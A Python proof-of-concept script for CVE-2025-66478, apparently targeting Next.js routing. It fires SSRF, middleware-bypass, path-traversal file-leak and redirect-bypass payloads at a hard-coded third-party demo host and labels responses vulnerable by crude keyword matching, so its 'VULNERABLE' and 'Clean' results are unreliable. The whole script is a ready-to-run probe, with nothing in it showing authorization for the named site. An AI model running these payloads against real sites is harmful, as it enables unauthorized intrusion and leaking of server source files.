#!/usr/bin/env python3
import requests
import urllib.parse
import sys
import json

TARGET = "https://demo.djangocfg.com"

payloads = {
    "SSRF_backslash_1": "/%5Chttp://127.0.0.1:3000",
    "SSRF_backslash_2": "/%5C%5Clocalhost:3000",
    "SSRF_double_slash": "//http://127.0.0.1:3000",
    "SSRF_dynamic_segment_1": "/api/http:/127.0.0.1:3000",
    "SSRF_dynamic_segment_2": "/api/https:/internal/status",
    "Middleware_bypass_1": "/.well-known/%5Chttp://127.0.0.1:3000",
    "Middleware_bypass_2": "/_next/%5Chttp://localhost:3000",
    "File_leak_1": "/app/%2e%2e/%2e%2e/server/app/page.js",
    "File_leak_2": "/_next/data/development/app/%2f..%2f..%2fserver/app/%2bpage.js",
    "File_leak_3": "/_next/static/%2e%2e/%2e%2e/server/app/layout.js",
    "Redirect_bypass_1": "/%5C/%5C/127.0.0.1:3000",
}

def check(target, path):
    url = target + path
    try:
        r = requests.get(url, timeout=8, allow_redirects=False)
        body = r.text[:400].replace("\n", "")
        return {
            "status": r.status_code,
            "location": r.headers.get("location"),
            "body_snippet": body
        }
    except Exception as e:
        return {"error": str(e)}

print("🔍 Testing CVE-2025-66478 PoC payloads")
print(f"🚀 Target: {TARGET}\n")

results = {}

for name, path in payloads.items():
    print(f"▶️  {name}: {path}")
    results[name] = check(TARGET, path)
    print(json.dumps(results[name], indent=2))
    print("-" * 60)

print("\n🏁 Done.")
print("📄 Summary (flags):\n")

for name, res in results.items():
    flagged = False

    if isinstance(res, dict):
        text = json.dumps(res)
        if any(x in text for x in [
            "ECONNREFUSED",
            ".next/server",
            "Invalid URL",
            "127.0.0.1",
            "localhost",
            "stack",
        ]):
            flagged = True

    print(f"{name}: {'🔥 VULNERABLE' if flagged else '✅ Clean'}")
